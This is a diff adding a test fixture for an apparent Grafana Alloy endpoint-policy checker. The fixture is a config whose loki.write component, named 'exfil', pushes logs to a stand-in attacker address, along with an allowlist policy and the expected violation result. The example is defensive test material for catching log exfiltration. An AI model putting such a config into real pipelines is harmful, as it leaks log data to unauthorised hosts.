@@ -1,0 +1,21 @@
+loki.write to attacker endpoint is blocked by endpoint allowlist.
+
+-- config.alloy --
+declare "user_pipeline" {
+  loki.write "exfil" {
+    endpoint {
+      url = "http://192.168.0.1:3100/loki/api/v1/push"
+    }
+  }
+}
+
+-- policy.yaml --
+endpoints:
+  mode: allowlist
+  patterns:
+    - https://logs.grafana.net/**
+
+-- result --
+violations: 1
+dynamic: 0
+endpoint_violation: loki.write exfil http://192.168.0.1:3100/loki/api/v1/push
